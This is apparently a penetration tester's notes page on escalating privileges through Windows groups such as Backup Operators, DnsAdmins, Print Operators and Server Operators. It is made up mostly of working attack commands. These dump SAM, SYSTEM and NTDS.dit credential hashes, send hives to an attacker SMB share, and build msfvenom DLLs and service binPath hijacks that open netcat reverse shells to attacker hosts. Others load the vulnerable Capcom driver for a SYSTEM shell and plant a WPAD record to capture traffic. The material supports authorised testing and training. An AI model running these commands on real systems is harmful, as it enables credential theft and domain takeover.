# Group Privileges

### Backup Operators

Grants the `SeBackupPrivilege`. <mark style="background-color:$danger;">This group also permits logging in locally to a domain controller. If we can't login locally on the DC, we can still dump the SAM remotely</mark>

{% embed url="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug" %}

#### Enable the privilege

```shellscript
# Check group membership 
whoami /groups

# Load the librairies from the Github above
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Check if SeBackupPrivilege is enabled 
whoami /priv
Get-SeBackupPrivilege

# If disabled, we can enable it
Set-SeBackupPrivilege

We now have access to the Copy-FileSeBackupPrivilege command
```

#### Read Local Files

The group membership allows us to read local files we are not allowed to on the computer

{% hint style="warning" %}
It's worth noting that if a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it
{% endhint %}

```shellscript
# We can now copy any file and access it 
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

#### Backup registries

The privilege lets us extract the different hives and dump the local hashes

```shellscript
# Extract SAM and SYSTEM hives 
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
reg save HKLM\SECURITY SECURITY.SAV

secretsdump.py -sam SAM.SAV -system SYSTEM.SAV -security SECURITY.SAV LOCAL
```

#### Attacking Domain Controllers : Copy NTDS.dit

{% hint style="danger" %}
If diskshadow keeps telling us we have a syntax problem even though we have the right one, add a # at the end of each line (it's a line break problem). See [https://charlti.gitbook.io/pentest-notes/ctf/htb/blackfield](https://charlti.gitbook.io/pentest-notes/ctf/htb/blackfield "mention") or /[https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html](https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html)
{% endhint %}

```shellscript
# Make a copy with the diskshadow utility
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

# Use our privileges to copy the file to a directory we have control over
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

# Also extract the SYSTEM hive as we need it to dump the hashes
reg save HKLM\SYSTEM SYSTEM.SAV

# Extract the hashes offline
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

# Or extract the hashes locally
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath <PATH_TO_NTDS.DIT> -BootKey $key
```

#### Backup Operator to DA (remote)

{% embed url="https://github.com/mpgn/BackupOperatorToDA?tab=readme-ov-file" %}

```shellscript
# Start SMB server on the attacker machine
sudo impacket-smbserver share -smb2support .

# Dump SAM, SYSTEM and SECURITY hives to the SMB share
.\BackupOperatorToDA.exe -t \\<DC> -u <BACKUP_OPERATOR_ACCOUNT> -p '<PASSWORD>' -d <DOMAIN> -o \\<ATTACKER_IP>\share\

# Dump SAM
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# DCSync using the machine account NT hash
impacket-secretsdump <DOMAIN>/'<DC_SAM_NAME>@<DC_FQDN>' -hashes :<MACHINE_ACCOUNT_NT_HASH> -just-dc
```

**Automate**

```shellscript
nxc smb <IP> -u <USER> -p <PASSWORD> -M backup_operator
```

### Event Log Readers

```shellscript
# Confirm group membership
net localgroup "Event Log Readers"
whoami /groups

# Searching security logs 
wevtutil qe Security /rd:true /f:text | Select-String "/user"
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

# Search remote location by passing credentials (/r:<REMOTE_COMPUTER>)
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

### DnsAdmins

```shellscript
# Check group membership 
whoami /groups
Get-ADGroupMember -Identity DnsAdmins

# Generate a payload to add a user to the domain admins group, or rev shell
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
msfvenom -p windows/x64/exec cmd='C:\Users\netadm\nc.exe -e C:\Windows\System32\cmd.exe <IP> <PORT>' -f dll -o rev.dll

# Transfer the files to the target (dll + nc.exe if needed) and load the dll 

# We must specify the full path to our custom DLL or the attack will not work properly !
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

# The payload will be executed the next time the DNS server restarts

# We can try to restart it ourself if we have the privs to do so
# Important to put the .exe
sc.exe stop dns
sc.exe start dns

# Check that the user was indeed added to the Domain Admins group
net group "Domain Admins" /dom

# To actually get the privs, we need to sign off and login again
```

**Cleaning up**

```shellscript
# Check that the ServerLevelPluginDll registry key exists
reg query \\<IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

# Delete the key as it points to our Dll 
reg delete \\<IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

# Start dns again 
sc.exe stop dns
sc.exe start dns
```

#### Creating a WPAD Record

Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives us the rights to [disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), which by default blocks this attack. Server 2008 first introduced the ability to add to a global query block list on a DNS server. By default, Web Proxy Automatic Discovery Protocol (WPAD) and Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global query block list. These protocols are quite vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names.

After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as [Responder](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.

```shellscript
# Disable the Global Query Block List
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <DC>

# Add a new WPAD record pointing to our attacker machine 
Add-DnsServerResourceRecordA -Name wpad -ZoneName <DOMAIN> -ComputerName <DC> -IPv4Address <ATTACKER_IP>
```

### Hyper-V Administrators

The [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) group has full access to all [Hyper-V features](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines). If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.

It is also well documented on this [blog](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), that upon deleting a virtual machine, `vmms.exe` attempts to restore the original file permissions on the corresponding `.vhdx` file and does so as `NT AUTHORITY\\SYSTEM`, without impersonating the user. We can delete the `.vhdx` file and create a native hard link to point this file to a protected SYSTEM file, which we will have full permissions to.

If the operating system is vulnerable to [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) or [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841), we can leverage this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.

```shellscript
# If firefox is installed on the system we will target the following file 
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe

# Run the above PoC to get control over the file 

# Taking ownership of the file
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe

# We can now replace the maintenanceservice.exe file with our own malicious file 
# start the service and get command execution as SYSTEM
sc.exe start MozillaMaintenance
```

{% hint style="warning" %}
Note: This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.
{% endhint %}

### Print Operators

Grants the `SeLoadDriverPrivilege`

#### With GUI

```shellscript
# Confirm privileges
whoami /priv

# If we don't see it, we need to bypass UAC, or get an admin console if we have GUI access
https://github.com/hfiref0x/UACME
https://github.com/yuyudhn/UACME-bin
https://www.youtube.com/watch?v=RXX0FHM9SEk   # How to compile around 20 mins

# If the priv is visible but disabled, we have to enable it
https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp

# Modify the above payload and add the lines below
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"

# Compile it from command line
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

# Download the Capcom.sys driver and save it to C:\Temp
https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys

# Add a reference to the driver
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

# Verify drive is not loaded
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom

# Run EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.exe

# It is normal if we still see the privilege as disabled
# As long as the command below shows an output, we are good to go

# Verify that the drive is now listed 
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom

# Compile the following project and execute the binary to get a SYSTEM SHELL
https://github.com/tandasat/ExploitCapcom
.\ExploitCapcom.exe
```

#### Without GUI

Follow the same steps as above, but apply changes below

```shellscript
# Modify line 410 of ExploitCapcom.cpp before compiling
# Replace C:\\Windows\\system32\\cmd.exe with a reverse shell we created
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");

# Then run ExploitCapcom.exe

# If a reverse shell connection is blocked for some reason, we can try a bind shell or 
# exec/add user payload.
```

#### Automating the steps

```shellscript
# Automate the process of enabling the priv, creating the registry key and executing
# NTLoadDriver to load the driver
https://github.com/TarlogicSecurity/EoPLoadDriver/
https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys

EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

# Then run ExploitCapcom.exe
https://github.com/tandasat/ExploitCapcom
.\ExploitCapcom.exe
```

**Cleaning up**

```shellscript
# Delete the registry key
reg delete HKCU\System\CurrentControlSet\Capcom
```

{% hint style="warning" %}
Note: Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY\_CURRENT\_USER".
{% endhint %}

### Server Operators

Allows members to administer Windows servers without needing assignment of Domain Admin privs

Grants `SeBackupPrivilege` and `SeRestorePrivilege`

```shellscript
# Confirm that a service runs as SYSTEM => Look for SERVICE_START_NAME
# LocalSystem = SYSTEM user
sc qc AppReadiness

# Check permissions of the service => look for permissions of Server Operators group
https://learn.microsoft.com/en-us/sysinternals/downloads/psservice
c:\Tools\PsService.exe security AppReadiness

# Modify the service binary path to execute our command
sc config AppReadiness binPath= "cmd /c net localgroup Administrators <USER> /add"
sc.exe config AppReadiness binPath="cmd /c C:\Tools\nc.exe -e C:\Windows\System32\cmd.exe <IP> <PORT> "

# Start the service to execute
sc start AppReadiness

# Check that our user was added to the administrator group 
net localgroup Administrators

# Confirm local admin access on the DC
nxc smb <IP> -u <USER> -p '<PASSWORD>'

# Dump hashes
secretsdump.py <USER>@<IP> -just-dc-user administrator
```
